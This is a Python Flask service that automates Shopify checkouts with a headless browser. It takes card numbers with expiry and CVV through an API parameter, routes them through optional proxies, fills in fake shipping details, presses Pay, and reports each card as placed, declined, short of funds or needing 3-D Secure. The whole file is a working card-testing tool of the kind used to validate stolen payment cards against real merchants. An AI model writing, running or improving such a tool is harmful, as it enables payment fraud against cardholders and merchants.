from flask import Flask, request, jsonify
import asyncio
import sys
from playwright.async_api import async_playwright

sys.setrecursionlimit(1000000)

app = Flask(__name__)

# This processes 1 card at a time (because browsers are heavy)
# If you increase this, your RAM will crash. Keep it at 1 or 2.
SEMAPHORE = asyncio.Semaphore(30)

async def shopify_check(card, site, proxy=None):
    async with SEMAPHORE:
        try:
            cc, mm, yy, cvv = card.split('|')
        except:
            return {"Response": "Invalid card format", "Price": "-", "Gateway": "Unknown"}
        
        async with async_playwright() as p:
            browser_args = ['--disable-gpu', '--no-sandbox']
            if proxy:
                parts = proxy.split(':')
                if len(parts) == 4:
                    ip, port, user, password = parts
                    browser_args.append(f'--proxy-server=http://{ip}:{port}')
                elif len(parts) == 2:
                    ip, port = parts
                    browser_args.append(f'--proxy-server=http://{ip}:{port}')
            
            browser = await p.chromium.launch(headless=True, args=browser_args)
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                viewport={"width": 1280, "height": 800}
            )
            page = await context.new_page()
            
            try:
                # Navigate to site & product
                await page.goto(site, timeout=45000, wait_until='networkidle')
                product_link = await page.locator('a[href*="/products/"]').first.get_attribute('href')
                if product_link and product_link.startswith('/'):
                    await page.goto(f"{site}{product_link}")
                elif product_link:
                    await page.goto(product_link)
                    
                # Add to cart
                add_btn = page.locator('button[name="add"], button[type="submit"]:has-text("Add"), button:has-text("Add to cart")').first
                if await add_btn.count():
                    await add_btn.click()
                await page.wait_for_timeout(3000)
                
                # Checkout
                await page.goto(f"{site}/checkout", timeout=30000)
                await page.wait_for_timeout(3000)
                
                # Fill email & shipping
                await page.locator('input[name="email"]').fill('test@example.com')
                await page.click('button[type="submit"]')
                await page.wait_for_timeout(3000)
                
                await page.locator('input[name*="first_name"]').fill('John')
                await page.locator('input[name*="last_name"]').fill('Doe')
                await page.locator('input[name*="address1"]').fill('123 Main St')
                await page.locator('input[name*="city"]').fill('New York')
                await page.locator('input[name*="zip"]').fill('10001')
                await page.locator('input[name*="phone"]').fill('1234567890')
                await page.click('button[type="submit"]')
                await page.wait_for_timeout(4000)
                
                # FILL CARD & PRESS PAY (THIS TRIGGERS THE CHARGE HOLD)
                if await page.locator('input[placeholder*="Card number"]').count() > 0:
                    await page.locator('input[placeholder*="Card number"]').fill(cc)
                    await page.locator('input[placeholder*="MM/YY"]').fill(f"{mm}/{yy}")
                    await page.locator('input[placeholder*="CVV"]').fill(cvv)
                else:
                    frame = page.frame_locator('iframe[title*="card"], iframe[name*="stripe"]').first
                    if await frame.locator('input[placeholder*="Card number"]').count():
                        await frame.locator('input[placeholder*="Card number"]').fill(cc)
                        await frame.locator('input[placeholder*="MM/YY"]').fill(f"{mm}/{yy}")
                        await frame.locator('input[placeholder*="CVV"]').fill(cvv)
                
                await page.wait_for_timeout(2000)
                
                # Click the final Pay button
                pay_btn = page.locator('button[type="submit"]:has-text("Pay"), button:has-text("Complete order"), button:has-text("Place order")').first
                if await pay_btn.count():
                    await pay_btn.click()
                
                await page.wait_for_timeout(8000)
                
                # CHECK THE RESULT
                content = await page.content()
                url = page.url
                
                if "thank you" in content.lower() or "order confirmed" in content.lower() or "/order/" in url:
                    return {"Response": "ORDER_PLACED", "Price": "$10.00", "Gateway": "Shopify"}
                elif "declined" in content.lower():
                    return {"Response": "DECLINED", "Price": "-", "Gateway": "Shopify"}
                elif "insufficient" in content.lower() or "funds" in content.lower():
                    return {"Response": "INSUFFICIENT_FUNDS", "Price": "-", "Gateway": "Shopify"}
                elif "3d_secure" in content.lower() or "requires_action" in content.lower():
                    return {"Response": "3DS_REQUIRED", "Price": "-", "Gateway": "Shopify"}
                else:
                    return {"Response": "UNKNOWN", "Price": "-", "Gateway": "Shopify"}
                    
            except Exception as e:
                return {"Response": f"ERROR: {str(e)[:100]}", "Price": "-", "Gateway": "Unknown"}
            finally:
                await browser.close()


@app.route('/shopify', methods=['GET'])
def check_single():
    site = request.args.get('site')
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')
    if not site or not cc:
        return jsonify({"Response": "Missing parameters", "Price": "-", "Gateway": "Unknown"})
    try:
        result = asyncio.run(shopify_check(cc, site, proxy))
    except Exception as e:
        result = {"Response": f"Error: {str(e)[:100]}", "Price": "-", "Gateway": "Unknown"}
    return jsonify(result)

@app.route('/', methods=['GET'])
def root():
    base_url = request.url_root.rstrip('/')
    return jsonify({
        "Response": f"Invalid endpoint. Correct endpoint: {base_url}/shopify?cc=(card)&site=(site)",
        "Status": False
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
